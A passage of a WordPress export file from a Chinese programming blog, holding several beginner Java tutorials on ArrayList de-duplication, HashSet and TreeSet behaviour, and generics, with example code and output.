		<wp:meta_value><![CDATA[209]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java的ArrayList练习-去除重复类</title>
		<link>https://www.nervgeek.com/2016/02/21/java%e7%9a%84arraylist%e7%bb%83%e4%b9%a0-%e5%8e%bb%e9%99%a4%e9%87%8d%e5%a4%8d%e7%b1%bb/</link>
		<pubDate>Sun, 21 Feb 2016 11:45:19 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1017</guid>
		<description></description>
		<content:encoded><![CDATA[前面好几个练习往集合立马塞的都是int、String等基本数据类型，但集合类和数组最大的区别就是集合类能存放类，所以这次练习我们就尝试存放类以及如何调用类。
示例代码：

<pre>import java.util.*;
public class Main {
    public static void main(String[] args) {
        ArrayListDemo();
    }
    public static void ArrayListDemo(){
        ArrayList al = new ArrayList();
        al.add(new Person("Mr9esx",20));
        al.add(new Person("Mr9esx01",21));
        al.add(new Person("Mr9esx02",22));
        al.add(new Person("Mr9esx03",23));
        al.add(new Person("Mr9esx01",21));
        al.add(new Person("Mr9esx03",23));
        Iterator it1 = al.iterator();
        sop("有重复的集合：");
        while(it1.hasNext()){
            Person p = (Person)it1.next();
            sop(p.getName()+" "+p.getAge());
        }
        al = singleElement(al);
        Iterator it2 = al.iterator();
        sop("去除完毕：");
        while(it2.hasNext()){
            Person p = (Person)it2.next();
            sop(p.getName()+" "+p.getAge());
        }
    }
    public static ArrayList singleElement(ArrayList al){
        ArrayList tmpAl = new ArrayList();
        Iterator it = al.iterator();
        while (it.hasNext()){
            Object obj = it.next();
            if(!tmpAl.contains(obj)){
            //contains里实际上用了equals方法来比较（可查看ArrayList的contains方法的源码），如果直接使用contains的equals是无法去重，所以我在Person类里重写了Person的equals。
                tmpAl.add(obj);
            }else{
                sop(obj+"有相同元素，已移除！");
            }
        }
        return tmpAl;
    }
    public static void sop(Object obj){
        System.out.println(obj);
    }
}
class Person{
    private String Name;
    private int Age;
    Person(String Name,int Age){
        this.Name = Name;
        this.Age = Age;
    }
    public String getName(){
        return Name;
    }
    public int getAge(){
        return Age;
    }
    public boolean equals(Object obj){
        //重写equals
        Person p = (Person)obj;
        System.out.println(this.Name+"="+p.Name+"?");
        System.out.println(this.Age+"="+p.Age+"?");
        System.out.println("-----------------------------");
        if(!(obj instanceof Person))
            return false;
        return this.Name.equals(p.Name) &amp;&amp; this.Age == p.Age;
    }
}</pre>

<!--more-->
输出结果：

<pre>有重复的集合：
Mr9esx 20
Mr9esx01 21
Mr9esx02 22
Mr9esx03 23
Mr9esx01 21
Mr9esx03 23
-----------------------------
Mr9esx01=Mr9esx?
21=20?
-----------------------------
Mr9esx02=Mr9esx?
22=20?
-----------------------------
Mr9esx02=Mr9esx01?
22=21?
-----------------------------
Mr9esx03=Mr9esx?
23=20?
-----------------------------
Mr9esx03=Mr9esx01?
23=21?
-----------------------------
Mr9esx03=Mr9esx02?
23=22?
-----------------------------
Mr9esx01=Mr9esx?
21=20?
-----------------------------
Mr9esx01=Mr9esx01?
21=21?
com.company.Person@74a14482有相同元素，已移除！
-----------------------------
Mr9esx03=Mr9esx?
23=20?
-----------------------------
Mr9esx03=Mr9esx01?
23=21?
-----------------------------
Mr9esx03=Mr9esx02?
23=22?
-----------------------------
Mr9esx03=Mr9esx03?
23=23?
com.company.Person@1540e19d有相同元素，已移除！
去除完毕：
Mr9esx 20
Mr9esx01 21
Mr9esx02 22
Mr9esx03 23</pre>

不仅仅是contains，remove底层也调用了equals，在删除元素的时候如果不重写equals直接使用remove

<pre>al.remove(new Person("Mr9esx03",23));</pre>

会删除失败，remove底层会遍历一遍集合，如果元素相同的话，便删除。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1017</wp:post_id>
		<wp:post_date><![CDATA[2016-02-21 19:45:19]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-21 11:45:19]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e7%9a%84arraylist%e7%bb%83%e4%b9%a0-%e5%8e%bb%e9%99%a4%e9%87%8d%e5%a4%8d%e7%b1%bb]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="arraylist"><![CDATA[ArrayList]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[194]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中集合类之HashSet</title>
		<link>https://www.nervgeek.com/2016/02/21/java%e4%b8%ad%e9%9b%86%e5%90%88%e7%b1%bb%e4%b9%8bhashset/</link>
		<pubDate>Sun, 21 Feb 2016 13:55:25 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1021</guid>
		<description></description>
		<content:encoded><![CDATA[我在
https://www.nervgeek.com/pages/937.html
这篇文章中讲了集合类的概念以及List的基本使用方法，这篇文章就介绍一下Set下面的HashSet的概念以及基本使用方法。
HashSet是无序（存入取出的顺序不一致）并且元素不能重复，看到Hash这个单词都会认为是根据哈希值来判断值是否相等。
但我们看JDK文档发现，HashSet复写了hashCode这个方法，意味着我们可以自己重写hashCode来伪造一样的哈希值。假如全部元素的哈希值都一样的话岂不是都存不进去吗？但当我们实际写了代码尝试之后，发现并不是这样：<!--more-->

<pre>import java.util.*;
public class Main {
    public static void main(String[] args) {
        HashSetDemo();
    }
    public static void HashSetDemo(){
        HashSet hs = new HashSet();
        hs.add(new Person("Mr9esx01",20));
        hs.add(new Person("Mr9esx02",21));
        hs.add(new Person("Mr9esx03",22));
        hs.add(new Person("Mr9esx03",22));
        Iterator it = hs.iterator();
        while (it.hasNext()){
            Person p = (Person)it.next();
            sop("哈希值："+p+"-"+p.getName()+"-"+p.getAge());
        }
    }
    public static void sop(Object obj){
        System.out.println(obj);
    }
}
class Person{
    private String Name;
    private int Age;
    Person(String Name,int Age){
        this.Name = Name;
        this.Age = Age;
    }
    public String getName(){
        return Name;
    }
    public int getAge(){
        return Age;
    }
    @Override
    public int hashCode() {
        return 10;
    }
}</pre>

输出结果：

<pre>哈希值：com.company.Person@a-Mr9esx01-20
哈希值：com.company.Person@a-Mr9esx02-21
哈希值：com.company.Person@a-Mr9esx03-22
哈希值：com.company.Person@a-Mr9esx03-22</pre>

虽然哈希值都相同，但是所有元素都存进HashSet里面了，可以得知HashSet并不单靠哈希值来判断是否一致。
在
https://www.nervgeek.com/pages/1017.html
这篇文章中，我们为了判断类是否相同，复写了equals这个方法，根据类里面的值来判断是否相同，所以我们在修改一下上面的代码：

<pre>import java.util.*;
public class Main {
    public static void main(String[] args) {
        ArrayListDemo();
    }
    public static void ArrayListDemo(){
        HashSet hs = new HashSet();
        hs.add(new Person("Mr9esx01",20));
        hs.add(new Person("Mr9esx02",21));
        hs.add(new Person("Mr9esx03",22));
        hs.add(new Person("Mr9esx03",22));
        Iterator it = hs.iterator();
        while (it.hasNext()){
            Person p = (Person)it.next();
            sop("哈希值："+p+"-"+p.getName()+"-"+p.getAge());
        }
    }
    public static void sop(Object obj){
        System.out.println(obj);
    }
}
class Person{
    private String Name;
    private int Age;
    Person(String Name,int Age){
        this.Name = Name;
        this.Age = Age;
    }
    public String getName(){
        return Name;
    }
    public int getAge(){
        return Age;
    }
    @Override
    public int hashCode() {
        return 10;
    }
    public boolean equals(Object obj){
        //重写equals
        Person p = (Person)obj;
        System.out.println(this.Name+"="+p.Name+"?");
        System.out.println(this.Age+"="+p.Age+"?");
        System.out.println("-----------------------------");
        if(!(obj instanceof Person))
            return false;
        return this.Name.equals(p.Name) &amp;&amp; this.Age == p.Age;
    }
}</pre>

输出结果：

<pre>Mr9esx02=Mr9esx01?
21=20?
-----------------------------
Mr9esx03=Mr9esx01?
22=20?
-----------------------------
Mr9esx03=Mr9esx02?
22=21?
-----------------------------
Mr9esx03=Mr9esx01?
22=20?
-----------------------------
Mr9esx03=Mr9esx02?
22=21?
-----------------------------
Mr9esx03=Mr9esx03?
22=22?
-----------------------------
哈希值：com.company.Person@a-Mr9esx01-20
哈希值：com.company.Person@a-Mr9esx02-21
哈希值：com.company.Person@a-Mr9esx03-22</pre>

重写了equals方法之后，重复的类终于被去除掉了。
<strong>可以得知，HashSet在存储元素的时候，先根据哈希值来对比一下是否相同，如果有相同的哈希值的时候，会调用equals来判断两个元素是否相同。而且有多个相同的哈希值的时候，会遍历一遍哈希值相同的元素用equals来判断。
</strong>
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1021</wp:post_id>
		<wp:post_date><![CDATA[2016-02-21 21:55:25]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-21 13:55:25]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e9%9b%86%e5%90%88%e7%b1%bb%e4%b9%8bhashset]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="hashset"><![CDATA[HashSet]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="set"><![CDATA[SET]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e9%9b%86%e5%90%88%e7%b1%bb"><![CDATA[集合类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_20630cb32f096448cc2a445e77d0f764]]></wp:meta_key>
		<wp:meta_value><![CDATA[<blockquote data-secret="TTHuLVpbS4" class="wp-embedded-content"><a href="http://www.nervgeek.com/pages/937.html">Java中集合类的概念以及使用方法</a></blockquote><iframe class="wp-embedded-content" sandbox="allow-scripts" security="restricted" style="display:none;" src="http://www.nervgeek.com/pages/937.html/embed#?secret=TTHuLVpbS4" data-secret="TTHuLVpbS4" width="600" height="338" title="嵌入的WordPress文章" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe>]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_time_20630cb32f096448cc2a445e77d0f764]]></wp:meta_key>
		<wp:meta_value><![CDATA[1456058629]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[223]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_a8e36c4d0749ffc6d631cf6675d939ff]]></wp:meta_key>
		<wp:meta_value><![CDATA[<blockquote data-secret="Pc6LP69guj" class="wp-embedded-content"><a href="http://www.nervgeek.com/pages/1017.html">Java的ArrayList练习-去除重复类</a></blockquote><iframe class="wp-embedded-content" sandbox="allow-scripts" security="restricted" style="display:none;" src="http://www.nervgeek.com/pages/1017.html/embed#?secret=Pc6LP69guj" data-secret="Pc6LP69guj" width="600" height="338" title="嵌入的WordPress文章" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe>]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_time_a8e36c4d0749ffc6d631cf6675d939ff]]></wp:meta_key>
		<wp:meta_value><![CDATA[1456063016]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_89409064f97c786d4584892fa7e71ac4]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_b14ce6aad83087be044bba805967cf6a]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_70a656ced0707db431bbe72215f9ec8d]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_17b687136dc0503fd455128ed80db5a1]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_15a09aa5334ce842cdc1f5c0592fbda1]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_f3e462ee60fddf3e33fd9fd821a77fa9]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_366b16cd0919f097f3aff5f4a86983bd]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中集合类之TreeSet</title>
		<link>https://www.nervgeek.com/2016/02/23/java%e4%b8%ad%e9%9b%86%e5%90%88%e7%b1%bb%e4%b9%8btreeset/</link>
		<pubDate>Tue, 23 Feb 2016 06:29:48 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1033</guid>
		<description></description>
		<content:encoded><![CDATA[TreeSet是一个使用二叉树排序的有序集合，存进TreeSet的基本类型按照字典排序，因为TreeSet中继承了Comparable接口和重写了compareTo这个方法。
int类型和String能排序(字典顺序也就是ascii码表), 自定义的类存储的时候出现异常，所以我们的类要继承Comparable接口重写compareTo。

<pre>import java.util.*;
public class Main {
    public static void main(String[] args) {
        
        TreeSet ts = new TreeSet();
        ts.add(new Person("Mr9esx01",20));
        ts.add(new Person("Mr9esx02",21));
        ts.add(new Person("Mr9esx03",22));
        ts.add(new Person("Mr9esx04",23));
        Iterator it = ts.iterator();
        while (it.hasNext()){
            Person p = (Person)it.next();
            sop(p.getName()+"-"+p.getAge());
        }
    }
    public static void sop(Object obj){
        System.out.println(obj);
    }
}
class Person implements Comparable{//该接口强制让类具备比较性
    private String Name;
    private int Age;
    Person(String Name,int Age){
        this.Name = Name;
        this.Age = Age;
    }
        public int compareTo(Object obj){
        if(!(obj instanceof Person)){
            throw new RuntimeException("不是Person对象");
        }
        Person p = (Person)obj;
        System.out.println(this.getName()+"~"+this.getAge()+
            "=="+p.getName()+"~"+p.getAge());
        System.out.println("-------------------------");
        if(this.getAge() &gt; p.getAge()){
            return 1;
        }
        if(this.getAge() == p.getAge()){
            return this.getName().compareTo(p.getName());
            //如果年龄相同，则按照字典顺序排序字符串。
            //Java中很多类都继承了Comparable接口，所以很多类都具有比较性。
        }
        return -1;//负整数是小于，零是等于，正整数是大于。
    }
    public String getName(){
        return Name;
    }
    public int getAge(){
        return Age;
    }
}</pre>

<!--more-->
我们还可以用另一种方式写排序，新建一个类，继承Comparator重写compare：

<pre>class MyCompara implements Comparator{
    public int compare(Object obj1,Object obj2){
        Person p1 = (Person)obj1;
        Person p2 = (Person)obj2;
        return p1.getName().compareTo(p2.getName());
    }
}</pre>

然后实例化TreeSet的时候：

<pre>TreeSet ts = new TreeSet(new MyCompara());</pre>

TreeSet会使用你构造的排序方法代替自带的排序。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1033</wp:post_id>
		<wp:post_date><![CDATA[2016-02-23 14:29:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-23 06:29:48]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e9%9b%86%e5%90%88%e7%b1%bb%e4%b9%8btreeset]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="comparable"><![CDATA[Comparable]]></category>
		<category domain="post_tag" nicename="comparator"><![CDATA[Comparator]]></category>
		<category domain="post_tag" nicename="compare"><![CDATA[compare]]></category>
		<category domain="post_tag" nicename="compareto"><![CDATA[compareTo]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="treeset"><![CDATA[TreeSet]]></category>
		<category domain="category" nicename="myphoto"><![CDATA[个人摄影]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[203]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中的泛型概念</title>
		<link>https://www.nervgeek.com/2016/02/25/java%e4%b8%ad%e7%9a%84%e6%b3%9b%e5%9e%8b%e6%a6%82%e5%bf%b5/</link>
		<pubDate>Thu, 25 Feb 2016 05:21:19 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1041</guid>
		<description></description>
		<content:encoded><![CDATA[泛型是Java在JDK 1.5的时候推出的一个新特性，主要解决了集合中类型转换错误的问题，例如有下面的一组代码：

<pre>ArrayList al = new ArrayList();
al.add("123");
al.add(4);
Iterator it = al.iterator();
while(it.hasNext()){
    String s = (String)it.next();
    sop(s.length());
}</pre>

第一个元素是字符串，String有length这个方法来计算长度。但是第二个元素是int类型，没有length方法，所以程序执行时会发生错误（编译不报错）。
所以泛型的出现解决了这一问题，定义了集合的类型，把错误在编译时就报出，而不是等到运行时再发生错误，大大节约了程序员解决问题的时间。
泛型的使用方法非常简单，在集合类型右边添加&lt;>，尖括号内输入会存进该集合的基本数据类型即可。

<pre>ArrayList<string> al = new ArrayList<string>();
al.add("123");
Iterator<string> it = al.iterator();
while(it.hasNext()){
    String s = it.next();
    sop(s.length());
}</pre>

在集合和迭代器使用了泛型指定了存入的数据的类型，使错误在编译时就能报出，而且编译时也没有了安全警告，迭代时也可以不使用强制类型转换了。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1041</wp:post_id>
		<wp:post_date><![CDATA[2016-02-25 13:21:19]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-25 05:21:19]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e7%9a%84%e6%b3%9b%e5%9e%8b%e6%a6%82%e5%bf%b5]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e6%b3%9b%e5%9e%8b"><![CDATA[泛型]]></category>
		<category domain="post_tag" nicename="%e9%9b%86%e5%90%88"><![CDATA[集合]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[243]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java之在自定义类中使用泛型</title>
		<link>https://www.nervgeek.com/2016/02/25/java%e4%b9%8b%e5%9c%a8%e8%87%aa%e5%ae%9a%e4%b9%89%e7%b1%bb%e4%b8%ad%e4%bd%bf%e7%94%a8%e6%b3%9b%e5%9e%8b/</link>
		<pubDate>Thu, 25 Feb 2016 09:23:12 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1045</guid>
		<description></description>
		<content:encoded><![CDATA[集合可以使用泛型来指定基本数据类型，但集合也是一个类，意味着我们自己的自定义类也能使用泛型。
假如有以下这样的代码：

<pre>class Dog{
}
class Cat{
}
class Tools{
    private Dog d;
    private Cat c;
    public void setADog(Dog d){
        this.d = d;
    }
    public Dog getADog(){
        return d;
    }
    public void setACat(Cat c){
        this.c = c;
    }
    public Cat getACat(){
        return c;
    }
}
public class Main {
    public static void main(String[] args) {
        Tools t = new Tools();
        t.setADog(new Dog());
        Dog d = (Dog)t.getADog();
        t.setACat(new Cat());
        Cat c = (Cat)t.getACat();
    }
    public static void sop(Object obj){
        System.out.println(obj);
    }
}</pre>

有多个类都要实现同一个动作，但类无法判断你传入的类型，导致代码量太多。在以前没有泛型的时候，可以使用Object来解决这个问题，但实例化的时候还需要强转：

<pre>class Tools{
    private Object obj;
    public void setObject(Object obj){
        this.obj = obj;
    }
    public Dog getObject(){
        return obj;
    }
}</pre>

在JDK1.5之后，我们可以使用泛型来解决这个问题。<!--more-->

<pre>class Dog{
}
class Cat{
}
class Tools<someThing>{
    private SomeThing st;
    public void setSomeThing(SomeThing st){
        this.st = st;
    }
    public SomeThing getSomeThing(){
        return st;
    }
}
public class Main {
    public static void main(String[] args) {
        Tools<dog> t = new Tools<dog>();
        t.setSomeThing(new Dog());
        Dog d = t.getSomeThing();
        t.setSomeThing(new Cat());
        Cat c = t.getSomeThing();
        /*报错，让报错发生在编译的时候*/
    }
    public static void sop(Object obj){
        System.out.println(obj);
    }
}</pre>

&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1045</wp:post_id>
		<wp:post_date><![CDATA[2016-02-25 17:23:12]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-25 09:23:12]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b9%8b%e5%9c%a8%e8%87%aa%e5%ae%9a%e4%b9%89%e7%b1%bb%e4%b8%ad%e4%bd%bf%e7%94%a8%e6%b3%9b%e5%9e%8b]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e6%b3%9b%e5%9e%8b"><![CDATA[泛型]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[239]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java之在方法中使用泛型</title>
		<link>https://www.nervgeek.com/2016/02/25/java%e4%b9%8b%e5%9c%a8%e6%96%b9%e6%b3%95%e4%b8%ad%e4%bd%bf%e7%94%a8%e6%b3%9b%e5%9e%8b/</link>
		<pubDate>Thu, 25 Feb 2016 11:20:29 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1050</guid>
		<description></description>
		<content:encoded><![CDATA[在上一篇文章中，我们定义了泛型类，让类可以接受多种类型的输入：

<pre>class Tools&lt;SomeThing&gt;{
    private SomeThing st;
    public void setSomeThing(SomeThing st){
        this.st = st;
    }
    public SomeThing getSomeThing(){
        return st;
    }
}</pre>

但有时候类并不是所有方法都适合传入的类型：<!--more-->

<pre>class Tools&lt;T&gt;{
    public void method1(T t){
        System.out.println("SomeThing"+t);
    }
    public void method2(T t){
        System.out.println("AnthorSomeThing"+t);
    }
}
public class Main {
    public static void main(String[] args) {
        Tools&lt;String&gt; t = new Tools&lt;String&gt;();
        t.method1("123");
        t.method1(4);
    }
}</pre>

当编译的时候，<code>t.mothed1(4);</code>会报错，因为泛型已经定义成了String（<code>Tools&lt;T&gt;</code>实际上<code>Tools&lt;String&gt;</code>，类下全部方法的<code>T t</code>实际上就变成<code>String t</code>），传入int的时候会导致编译失败。假如我们希望某个类型可以传入不同的类型并只能执行他的方法，因此我们便要使用泛型方法。

<pre>class Tools{
    public &lt;A&gt; void method1(A a){
        System.out.println("SomeThing"+a);
    }
    public &lt;B&gt; void method2(B b){
        System.out.println("AnthorSomeThing"+b);
    }
}
public class Main {
<code></code>    public static void main(String[] args) {
        Tools t = new Tools();
        t.method1("123");
        t.method1(4);
    }
}</pre>

改成上面的代码，方法可以接收任何类型。
也可以改成这样：

<pre>class Tools&lt;T&gt;{
